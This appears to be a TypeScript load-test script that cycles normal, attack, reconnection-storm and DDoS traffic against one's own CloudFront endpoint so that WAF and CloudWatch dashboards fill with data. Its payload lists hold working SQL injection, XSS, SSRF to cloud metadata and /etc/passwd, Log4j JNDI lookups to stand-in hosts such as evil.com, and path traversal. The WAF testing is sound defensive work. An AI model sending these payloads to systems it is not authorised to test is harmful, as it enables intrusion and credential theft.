/**
 * 1-Hour Sustained Load Test — Mixed Scenarios
 *
 * Cycles through realistic traffic patterns over 1 hour to populate
 * WAF and CloudWatch dashboards with rich time-series data.
 *
 * Scenario rotation (repeats every 12 minutes):
 *   0-3 min:  Normal steady-state (35% player, 55% S2S, 10% admin) @ 30 RPS
 *   3-5 min:  Attack wave (SQLi, XSS, SSRF, Log4j, bots) @ 50 RPS
 *   5-8 min:  Reconnection storm (85% player burst) @ 80 RPS
 *   8-10 min: DDoS mixed with legitimate @ 60 RPS
 *   10-12 min: Recovery + low attack background @ 20 RPS
 *
 * All 3 paths exercised: /nginx/*, /lambda/*, /apigw/*
 */

import axios from 'axios';

const ENDPOINT = process.argv[2] || 'https://<your-cloudfront-domain>';
const DURATION_MS = 60 * 60 * 1000; // 1 hour
const CYCLE_MS = 12 * 60 * 1000; // 12-minute cycles

const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
const GAMES = ['ac-valhalla', 'r6-siege', 'far-cry-6', 'the-division-2', 'xdefiant'];
const PLATFORMS = ['pc', 'ps5', 'xbox', 'switch', 'mobile'];
const PATHS = ['/nginx', '/lambda', '/apigw'];

const SQLI = ["' OR 1=1--", "'; DROP TABLE users;--", "1 UNION SELECT * FROM creds", "admin'--", "1; EXEC xp_cmdshell('id')"];
const XSS = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><svg onload=alert(1)>', "javascript:alert('xss')"];
const SSRF = ['http://169.254.169.254/latest/meta-data/', 'http://127.0.0.1:6379/', 'file:///etc/passwd'];
const LOG4J = ['${jndi:ldap://evil.com/x}', '${jndi:rmi://bad.com/o}', '${${lower:j}ndi:ldap://x.com/a}'];
const BOT_UAS = ['python-requests/2.28.0', 'Go-http-client/1.1', 'Scrapy/2.7', 'libwww-perl/6.67', 'curl/7.88', 'Wget/1.21'];
const GAME_ENDPOINTS = ['/v1/auth/session', '/v1/profiles/me', '/v1/matchmaking/queue', '/v1/config/game', '/v1/inventory/items', '/v1/social/friends', '/v1/leaderboards/global', '/v1/store/offers'];
const S2S_ENDPOINTS = ['/v1/telemetry/events', '/v1/inventory/sync', '/v1/leaderboards/update'];

function pick<T>(arr: T[]): T { return arr[Math.floor(Math.random() * arr.length)]; }

const client = axios.create({ baseURL: ENDPOINT, timeout: 10000, validateStatus: () => true });

let stats = { total: 0, allowed: 0, blocked: 0, errors: 0 };
let scenarioStats: Record<string, { sent: number; blocked: number }> = {
  legitimate: { sent: 0, blocked: 0 }, sqli: { sent: 0, blocked: 0 }, xss: { sent: 0, blocked: 0 },
  ssrf: { sent: 0, blocked: 0 }, log4j: { sent: 0, blocked: 0 }, bot: { sent: 0, blocked: 0 },
  pathTraversal: { sent: 0, blocked: 0 }, rateProbe: { sent: 0, blocked: 0 },
  s2s: { sent: 0, blocked: 0 }, admin: { sent: 0, blocked: 0 }, reconnection: { sent: 0, blocked: 0 },
};

function record(type: string, status: number) {
  stats.total++;
  scenarioStats[type].sent++;
  if (status === 403) { stats.blocked++; scenarioStats[type].blocked++; }
  else if (status >= 200 && status < 400) stats.allowed++;
  else stats.errors++;
}

async function legitimate(path?: string) {
  const p = path || pick(PATHS);
  const res = await client.get(`${p}${pick(GAME_ENDPOINTS)}`, {
    headers: { 'X-Game-Id': pick(GAMES), 'X-Platform': pick(PLATFORMS), 'X-Client-Version': '2.1.0', 'User-Agent': BROWSER_UA, 'Authorization': `Bearer tok-${Math.random().toString(36).slice(2)}` },
  });
  record('legitimate', res.status);
}

async function s2s() {
  const res = await client.get(`${pick(PATHS)}${pick(S2S_ENDPOINTS)}`, {
    headers: { 'X-Traffic-Type': 's2s', 'X-Service-Name': 'game-server', 'X-Game-Id': pick(GAMES), 'User-Agent': BROWSER_UA, 'Authorization': 'Bearer s2s-token' },
  });
  record('s2s', res.status);
}

async function admin() {
  const res = await client.get(`${pick(PATHS)}/v1/admin/status`, {
    headers: { 'X-Traffic-Type': 'admin', 'X-Game-Id': 'ops', 'User-Agent': BROWSER_UA, 'Authorization': 'Bearer admin-token' },
  });
  record('admin', res.status);
}

async function reconnection() {
  const res = await client.get(`${pick(PATHS)}${pick(GAME_ENDPOINTS)}`, {
    headers: { 'X-Game-Id': pick(GAMES), 'X-Platform': pick(PLATFORMS), 'X-Client-Version': '2.1.0', 'User-Agent': BROWSER_UA, 'Authorization': `Bearer reconnect-${Date.now()}` },
  });
  record('reconnection', res.status);
}

async function sqli() {
  const res = await client.get(`${pick(PATHS)}/v1/profiles/me?id=${encodeURIComponent(pick(SQLI))}`, { headers: { 'User-Agent': BROWSER_UA } });
  record('sqli', res.status);
}

async function xss() {
  const res = await client.get(`${pick(PATHS)}/v1/profiles/search?q=${encodeURIComponent(pick(XSS))}`, { headers: { 'User-Agent': BROWSER_UA } });
  record('xss', res.status);
}

async function ssrf() {
  const res = await client.get(`${pick(PATHS)}/v1/config/game?url=${encodeURIComponent(pick(SSRF))}`, { headers: { 'User-Agent': BROWSER_UA } });
  record('ssrf', res.status);
}

async function log4j() {
  const res = await client.get(`${pick(PATHS)}/health`, { headers: { 'X-Api-Version': pick(LOG4J), 'User-Agent': BROWSER_UA } });
  record('log4j', res.status);
}

async function bot() {
  const res = await client.get(`${pick(PATHS)}${pick(GAME_ENDPOINTS)}`, { headers: { 'User-Agent': pick(BOT_UAS) } });
  record('bot', res.status);
}

async function pathTraversal() {
  const res = await client.get(`${pick(PATHS)}/../../etc/passwd`, { headers: { 'User-Agent': BROWSER_UA } });
  record('pathTraversal', res.status);
}

async function rateProbe() {
  // No X-Game-Id — triggers NonPlayerRateLimit
  const res = await client.get(`${pick(PATHS)}${pick(GAME_ENDPOINTS)}`, { headers: { 'User-Agent': BROWSER_UA } });
  record('rateProbe', res.status);
}

type Scenario = 'normal' | 'attack' | 'storm' | 'ddos' | 'recovery';

function getScenario(elapsedInCycle: number): { scenario: Scenario; rps: number } {
  const min = elapsedInCycle / 60000;
  if (min < 3) return { scenario: 'normal', rps: 30 };
  if (min < 5) return { scenario: 'attack', rps: 50 };
  if (min < 8) return { scenario: 'storm', rps: 80 };
  if (min < 10) return { scenario: 'ddos', rps: 60 };
  return { scenario: 'recovery', rps: 20 };
}

async function sendForScenario(scenario: Scenario) {
  const rand = Math.random();
  try {
    switch (scenario) {
      case 'normal':
        if (rand < 0.35) await legitimate();
        else if (rand < 0.75) await s2s();
        else if (rand < 0.85) await admin();
        else if (rand < 0.90) await sqli();
        else if (rand < 0.95) await bot();
        else await rateProbe();
        break;
      case 'attack':
        if (rand < 0.20) await legitimate();
        else if (rand < 0.40) await sqli();
        else if (rand < 0.55) await xss();
        else if (rand < 0.65) await ssrf();
        else if (rand < 0.75) await log4j();
        else if (rand < 0.85) await pathTraversal();
        else if (rand < 0.95) await bot();
        else await rateProbe();
        break;
      case 'storm':
        if (rand < 0.85) await reconnection();
        else if (rand < 0.90) await s2s();
        else if (rand < 0.95) await bot();
        else await sqli();
        break;
      case 'ddos':
        if (rand < 0.35) await legitimate();
        else if (rand < 0.50) await rateProbe();
        else if (rand < 0.65) await bot();
        else if (rand < 0.75) await sqli();
        else if (rand < 0.85) await xss();
        else if (rand < 0.92) await pathTraversal();
        else await log4j();
        break;
      case 'recovery':
        if (rand < 0.60) await legitimate();
        else if (rand < 0.80) await s2s();
        else if (rand < 0.90) await admin();
        else await bot();
        break;
    }
  } catch { stats.total++; stats.errors++; }
}

async function main() {
  console.log('🔥 1-Hour Sustained Load Test — Mixed Scenarios');
  console.log('================================================');
  console.log(`   Endpoint:  ${ENDPOINT}`);
  console.log(`   Duration:  1 hour (5 cycles of 12 minutes)`);
  console.log(`   Paths:     /nginx/*, /lambda/*, /apigw/*`);
  console.log(`   Scenarios: Normal(30rps) → Attack(50rps) → Storm(80rps) → DDoS(60rps) → Recovery(20rps)`);
  console.log('');
  console.log('   Starting...');
  console.log('');

  const startTime = Date.now();
  const endTime = startTime + DURATION_MS;
  let lastScenario: Scenario = 'normal';

  const progressInterval = setInterval(() => {
    const elapsed = Math.round((Date.now() - startTime) / 60000);
    const blockRate = stats.total > 0 ? (stats.blocked / stats.total * 100).toFixed(1) : '0';
    console.log(
      `   [${elapsed.toString().padStart(2)}min] [${lastScenario.padEnd(8)}] Total: ${stats.total} | ✅ ${stats.allowed} | 🚫 ${stats.blocked} (${blockRate}%) | ❌ ${stats.errors}`
    );
  }, 60000);

  while (Date.now() < endTime) {
    const elapsedInCycle = (Date.now() - startTime) % CYCLE_MS;
    const { scenario, rps } = getScenario(elapsedInCycle);

    if (scenario !== lastScenario) {
      const elapsed = Math.round((Date.now() - startTime) / 60000);
      const icons: Record<Scenario, string> = { normal: '📊', attack: '💥', storm: '🌊', ddos: '🚨', recovery: '✅' };
      console.log(`   [${elapsed.toString().padStart(2)}min] ${icons[scenario]} Scenario: ${scenario.toUpperCase()} @ ${rps} RPS`);
      lastScenario = scenario;
    }

    await sendForScenario(scenario);
    await new Promise(r => setTimeout(r, 1000 / rps));
  }

  clearInterval(progressInterval);

  console.log('\n\n📊 FINAL RESULTS (1 Hour)');
  console.log('=========================');
  console.log(`   Total Requests:  ${stats.total}`);
  console.log(`   Allowed:         ${stats.allowed} (${(stats.allowed / stats.total * 100).toFixed(1)}%)`);
  console.log(`   Blocked:         ${stats.blocked} (${(stats.blocked / stats.total * 100).toFixed(1)}%)`);
  console.log(`   Errors:          ${stats.errors}`);
  console.log('');
  console.log('   Breakdown by type:');
  console.log('   ─────────────────────────────────────────');
  for (const [type, s] of Object.entries(scenarioStats)) {
    if (s.sent > 0) {
      const blockPct = (s.blocked / s.sent * 100).toFixed(0);
      console.log(`     ${type.padEnd(15)} ${s.sent.toString().padStart(5)} sent | ${s.blocked.toString().padStart(5)} blocked (${blockPct}%)`);
    }
  }
  console.log('');
  console.log('   ✅ Check WAF console + CloudWatch dashboards for time-series data.');
}

main().catch(err => { console.error('Fatal:', err); process.exit(1); });
